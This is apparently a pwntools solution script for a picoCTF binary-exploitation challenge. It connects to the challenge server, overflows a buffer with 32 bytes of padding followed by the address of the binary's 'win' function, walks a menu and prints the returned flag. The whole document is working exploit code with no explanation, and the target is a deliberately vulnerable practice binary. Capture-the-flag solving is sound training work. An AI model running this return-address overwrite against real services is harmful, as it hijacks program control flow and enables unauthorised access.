from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
#io = elf.process()
io = remote("mimas.picoctf.net", 63176)
#context.log_level = "debug"

payload = b"A" * 32 + p64(elf.symbols["win"])
io.sendlineafter(b": ", b"2")
io.sendlineafter(b":", payload)
io.sendlineafter(b": ", b"4")

flag = io.recvline().strip()
log.success(flag.decode())

io.close()
